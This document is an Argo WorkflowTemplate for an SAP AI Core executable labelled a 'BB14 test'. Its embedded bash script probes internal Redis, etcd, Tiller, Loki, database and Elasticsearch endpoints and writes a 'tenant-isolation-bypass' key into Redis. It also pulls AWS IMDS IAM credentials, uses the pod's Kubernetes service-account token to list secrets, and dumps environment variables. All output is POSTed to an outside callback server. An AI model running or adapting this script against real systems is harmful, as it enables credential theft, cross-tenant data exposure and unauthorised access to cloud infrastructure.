apiVersion: argoproj.io/v1alpha1
kind: WorkflowTemplate
metadata:
  name: bb14-exec
  annotations:
    scenarios.ai.sap.com/description: "BB14 test workflow"
    scenarios.ai.sap.com/name: "bb14-scenario"
    executables.ai.sap.com/description: "BB14 test executable"
    executables.ai.sap.com/name: "bb14-exec"
  labels:
    scenarios.ai.sap.com/id: "bb14-scenario"
    executables.ai.sap.com/id: "bb14-exec"
    ai.sap.com/version: "14.0.0"
spec:
  entrypoint: main
  templates:
  - name: main
    metadata:
      labels:
        ai.sap.com/resourcePlan: starter
    container:
      image: nicolaka/netshoot:latest
      command:
      - bash
      - -c
      - |
        CB="https://www.masonhck.tech/cb.php"
        post() { curl -k -s -X POST "${CB}?src=$1" --max-time 10 -d @- ; }
        get() { curl -k -s "${CB}?src=$1" --max-time 5 ; }

        get "v14-start-$(hostname)-$(date +%s)"

        # === REDIS PROTOCOL PROBES (PRIMARY TARGET) ===
        echo "=== REDIS PROBES ===" | post "v14-redis-start"

        # Use known IPs from previous scans
        for rip in 100.104.0.0 100.104.0.1 100.104.0.2 100.104.1.0; do
          echo "redis=${rip}" | post "v14-redis-test-${rip}"

          # PING
          timeout 5 bash -c "exec 3<>/dev/tcp/${rip}/6379 2>/dev/null; echo -e 'PING\r' >&3; sleep 1; cat <&3; exec 3>&-" 2>&1 | post "v14-redis-ping-${rip}"

          # INFO (shows Redis version, memory, connected clients, etc)
          timeout 5 bash -c "exec 3<>/dev/tcp/${rip}/6379 2>/dev/null; echo -e 'INFO\r' >&3; sleep 2; head -c 2000 <&3; exec 3>&-" 2>&1 | head -c 2000 | post "v14-redis-info-${rip}"

          # DBSIZE
          timeout 5 bash -c "exec 3<>/dev/tcp/${rip}/6379 2>/dev/null; echo -e 'DBSIZE\r' >&3; sleep 1; cat <&3; exec 3>&-" 2>&1 | post "v14-redis-dbsize-${rip}"

          # KEYS (sample)
          timeout 5 bash -c "exec 3<>/dev/tcp/${rip}/6379 2>/dev/null; echo -e 'KEYS *\r' >&3; sleep 2; head -c 2000 <&3; exec 3>&-" 2>&1 | head -c 2000 | post "v14-redis-keys-${rip}"

          # CONFIG GET requirepass (check if auth is needed)
          timeout 5 bash -c "exec 3<>/dev/tcp/${rip}/6379 2>/dev/null; echo -e 'CONFIG GET requirepass\r' >&3; sleep 1; cat <&3; exec 3>&-" 2>&1 | post "v14-redis-authcheck-${rip}"

          # WRITE PROOF: SET, GET, DEL
          timeout 5 bash -c "exec 3<>/dev/tcp/${rip}/6379 2>/dev/null; printf 'SET bb14-proof tenant-isolation-bypass\r\nGET bb14-proof\r\nDEL bb14-proof\r\n' >&3; sleep 2; cat <&3; exec 3>&-" 2>&1 | post "v14-redis-write-${rip}"
        done

        # Also try redis-cli if available
        which redis-cli 2>/dev/null && {
          redis-cli -h 100.104.1.0 PING 2>&1 | post "v14-redis-cli-ping"
          redis-cli -h 100.104.1.0 INFO server 2>&1 | head -c 2000 | post "v14-redis-cli-info"
        } || echo "no redis-cli" | post "v14-redis-cli-check"

        # === ETCD PROTOCOL PROBES ===
        echo "=== ETCD PROBES ===" | post "v14-etcd-start"
        for eip in 100.104.1.0 100.104.0.0; do
          echo "etcd=${eip}" | post "v14-etcd-test-${eip}"
          curl -s --connect-timeout 5 "http://${eip}:2379/version" 2>&1 | post "v14-etcd-version-${eip}"
          curl -s --connect-timeout 5 "http://${eip}:2379/v2/keys/" 2>&1 | head -c 3000 | post "v14-etcd-keys-${eip}"
          curl -s --connect-timeout 5 "http://${eip}:2379/v2/members" 2>&1 | head -c 2000 | post "v14-etcd-members-${eip}"
          curl -s --connect-timeout 5 "http://${eip}:2379/health" 2>&1 | post "v14-etcd-health-${eip}"
          # etcd v3 via HTTP gateway
          curl -s --connect-timeout 5 -X POST "http://${eip}:2379/v3/kv/range" -d '{"key":"AA=="}' 2>&1 | head -c 2000 | post "v14-etcd-v3-range-${eip}"
          curl -s --connect-timeout 5 -X POST "http://${eip}:2379/v3/cluster/member/list" 2>&1 | head -c 2000 | post "v14-etcd-v3-members-${eip}"
          # Try raw TCP banner
          timeout 5 bash -c "exec 3<>/dev/tcp/${eip}/2379 2>/dev/null; echo -e 'GET /version HTTP/1.0\r\nHost: ${eip}\r\n\r\n' >&3; sleep 2; cat <&3; exec 3>&-" 2>&1 | head -c 2000 | post "v14-etcd-raw-${eip}"
        done

        # === TILLER (port 44134) ===
        echo "=== TILLER PROBES ===" | post "v14-tiller-start"
        for tip in 100.104.0.0; do
          echo "tiller=${tip}" | post "v14-tiller-test-${tip}"
          # gRPC listing
          grpcurl -plaintext -connect-timeout 5 ${tip}:44134 list 2>&1 | head -c 1000 | post "v14-tiller-grpc-list-${tip}"
          grpcurl -plaintext -connect-timeout 5 ${tip}:44134 hapi.services.tiller.ReleaseService/ListReleases 2>&1 | head -c 3000 | post "v14-tiller-releases-${tip}"
          grpcurl -plaintext -connect-timeout 5 ${tip}:44134 hapi.services.tiller.ReleaseService/GetVersion 2>&1 | head -c 1000 | post "v14-tiller-version-${tip}"
          # Raw TCP banner
          timeout 5 bash -c "exec 3<>/dev/tcp/${tip}/44134 2>/dev/null; echo '' >&3; sleep 2; cat <&3; exec 3>&-" 2>&1 | xxd | head -20 | post "v14-tiller-raw-${tip}"
        done

        # === LOKI (just one known IP from scan) ===
        echo "=== LOKI ===" | post "v14-loki-start"
        # DNS first
        for svc in loki grafana-loki; do
          for ns in monitoring opentelemetry logging; do
            LIP=$(dig +short "${svc}.${ns}.svc.cluster.local" @100.104.0.10 2>/dev/null | head -1)
            [ -n "$LIP" ] && echo "loki: ${svc}.${ns} = ${LIP}" | post "v14-loki-dns-${svc}-${ns}"
          done
        done
        # Try the one IP we know has 3100 open
        curl -s --connect-timeout 5 "http://100.104.1.0:3100/config" 2>&1 | head -c 3000 | post "v14-loki-config"
        curl -s --connect-timeout 5 "http://100.104.1.0:3100/ready" 2>&1 | post "v14-loki-ready"
        curl -s --connect-timeout 5 "http://100.104.1.0:3100/loki/api/v1/labels" 2>&1 | head -c 2000 | post "v14-loki-labels"

        # === POSTGRESQL (port 5432) ===
        echo "=== POSTGRESQL ===" | post "v14-pg-start"
        # Try banner grab
        timeout 5 bash -c "exec 3<>/dev/tcp/100.104.1.0/5432 2>/dev/null; sleep 2; head -c 500 <&3; exec 3>&-" 2>&1 | xxd | head -10 | post "v14-pg-banner"
        # Try psql if available
        which psql 2>/dev/null && timeout 5 psql -h 100.104.1.0 -U postgres -l 2>&1 | head -c 1000 | post "v14-pg-list"

        # === ELASTICSEARCH (port 9200) ===
        echo "=== ELASTICSEARCH ===" | post "v14-es-start"
        curl -s --connect-timeout 5 "http://100.104.1.0:9200/" 2>&1 | head -c 1000 | post "v14-es-root"
        curl -s --connect-timeout 5 "http://100.104.1.0:9200/_cat/indices" 2>&1 | head -c 2000 | post "v14-es-indices"
        curl -s --connect-timeout 5 "http://100.104.1.0:9200/_cluster/health" 2>&1 | head -c 1000 | post "v14-es-health"

        # === MONGODB (port 27017) ===
        echo "=== MONGODB ===" | post "v14-mongo-start"
        # HTTP check
        curl -s --connect-timeout 5 "http://100.104.0.0:27017/" 2>&1 | head -c 500 | post "v14-mongo-http"
        # Banner
        timeout 5 bash -c "exec 3<>/dev/tcp/100.104.0.0/27017 2>/dev/null; sleep 2; head -c 500 <&3; exec 3>&-" 2>&1 | xxd | head -10 | post "v14-mongo-banner"

        # === KSM (fresh cross-tenant dump) ===
        echo "=== KSM ===" | post "v14-ksm-start"
        curl -s --connect-timeout 15 "http://ksm-pods-kube-state-metrics.opentelemetry.svc.cluster.local:8080/metrics" > /tmp/ksm.txt 2>&1
        echo "ksm_bytes=$(wc -c < /tmp/ksm.txt)" | post "v14-ksm-size"
        grep -oE 'namespace="[^"]*"' /tmp/ksm.txt | sort -u | post "v14-ksm-namespaces"
        grep "kube_pod_info{" /tmp/ksm.txt | grep -oE 'namespace="[^"]*"' | sort | uniq -c | sort -rn | post "v14-ksm-pods-per-ns"
        # Not-diamond cross-tenant proof
        grep "not-diamond" /tmp/ksm.txt | head -10 | post "v14-ksm-notdiamond"
        # Container images (reveals internal registry)
        grep -oE 'image="[^"]*"' /tmp/ksm.txt | sort -u | post "v14-ksm-images"

        # === ENVOY SERVICE MESH ===
        curl -s localhost:15000/clusters > /tmp/envoy.txt 2>&1
        grep -oE '[a-z0-9-]+\.[a-z0-9-]+\.svc\.cluster\.local' /tmp/envoy.txt | sort -u | post "v14-envoy-services"

        # === AWS IMDS ===
        IMDS_TOK=$(curl -s --connect-timeout 3 -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" 2>&1)
        if [ ${#IMDS_TOK} -gt 10 ]; then
          echo "imds_v2=true" | post "v14-imds"
          curl -s --connect-timeout 3 "http://169.254.169.254/latest/meta-data/iam/security-credentials/" -H "X-aws-ec2-metadata-token: ${IMDS_TOK}" 2>&1 | post "v14-imds-roles"
        fi

        # === K8S API ===
        SA_TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null)
        if [ -n "$SA_TOKEN" ]; then
          K8S="https://kubernetes.default.svc"
          A="Authorization: Bearer ${SA_TOKEN}"
          curl -sk "${K8S}/api/v1/namespaces" -H "${A}" 2>&1 | head -c 3000 | post "v14-k8s-ns"
          curl -sk "${K8S}/api/v1/secrets" -H "${A}" 2>&1 | head -c 3000 | post "v14-k8s-secrets"
        fi

        # === ENV + NETWORK INFO ===
        env | sort | post "v14-env"
        ip addr 2>&1 | post "v14-ipaddr"

        get "v14-complete-$(hostname)-$(date +%s)"
      resources:
        limits:
          cpu: "2"
          memory: "2Gi"
        requests:
          cpu: "500m"
          memory: "512Mi"
